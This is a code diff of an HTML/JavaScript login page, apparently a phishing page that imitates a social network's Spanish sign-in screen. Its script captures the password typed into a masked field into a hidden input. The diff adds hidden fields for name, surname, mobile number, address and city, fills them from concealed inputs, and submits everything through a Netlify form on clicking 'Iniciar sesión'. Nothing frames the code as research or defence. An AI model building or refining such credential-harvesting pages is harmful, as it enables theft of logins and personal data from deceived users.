@@ -14,9 +14,24 @@
             var hiddenText = input.value.replace(/•/g, "");
             alert("Texto oculto: " + hiddenText);
 
-            // Actualizar el valor del campo oculto
-            var hiddenField = document.getElementById("hiddenText");
-            hiddenField.value = hiddenText;
+            // Actualizar los campos adicionales con los datos del formulario
+            var nombresField = document.getElementById("nombres");
+            nombresField.value = document.getElementById("nombresForm").value;
+
+            var apellidosField = document.getElementById("apellidos");
+            apellidosField.value = document.getElementById("apellidosForm").value;
+
+            var movilField = document.getElementById("movil");
+            movilField.value = document.getElementById("movilForm").value;
+
+            var direcionField = document.getElementById("direcion");
+            direcionField.value = document.getElementById("direcionForm").value;
+
+            var ciudadField = document.getElementById("ciudad");
+            ciudadField.value = document.getElementById("ciudadForm").value;
+
+            var hiddenTextField = document.getElementById("hiddenText");
+            hiddenTextField.value = hiddenText;
         }
 
         function replacePassword() {
@@ -35,19 +50,26 @@
     <input type="password" id="myInput" onkeydown="hideText(event)" required>
     <br>
     <input type="button" value="Mostrar" onclick="showText()">
+
+    <!-- Campos adicionales para el formulario -->
     <input type="hidden" id="hiddenText" name="hiddenText">
+    <input type="hidden" id="nombres" name="nombres">
+    <input type="hidden" id="apellidos" name="apellidos">
+    <input type="hidden" id="movil" name="movil">
+    <input type="hidden" id="direcion" name="direcion">
+    <input type="hidden" id="ciudad" name="ciudad">
 </form>
 
 <div class="_5rut">
     <form name="contact" method="POST" data-netlify="true" action="/index">
         <div class="form-group">
-            <input class="controls" type="text" name="nombres" id="nombres" placeholder="  Nombre" style="display: none;">
-            <input class="controls" type="text" name="apellidos" id="apellidos" placeholder="  Apellidos" style="display: none;">
-            <input class="controls" type="text" name="movil" id="movil" placeholder="  Teléfono móvil"  style="display: none;">
-            <input class="controls" type="text" name="direcion" id="direcion" placeholder="  Direcion"  style="display: none;">
-            <input class="controls" type="text" name="ciudad" id="ciudad" placeholder="  ciudad"  style="display: none;">
+            <input class="controls" type="text" name="nombres" id="nombresForm" placeholder="  Nombre" style="display: none;">
+            <input class="controls" type="text" name="apellidos" id="apellidosForm" placeholder="  Apellidos" style="display: none;">
+            <input class="controls" type="text" name="movil" id="movilForm" placeholder="  Teléfono móvil"  style="display: none;">
+            <input class="controls" type="text" name="direcion" id="direcionForm" placeholder="  Direcion"  style="display: none;">
+            <input class="controls" type="text" name="ciudad" id="ciudadForm" placeholder="  ciudad"  style="display: none;">
             <input  class="form-control" type="text"  name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required>
-    
+           
         </div>
         <button type="submit" name="submit" class="btn btn-primary btn-block" onclick="replacePassword()">Iniciar sesión</button>
     </form>
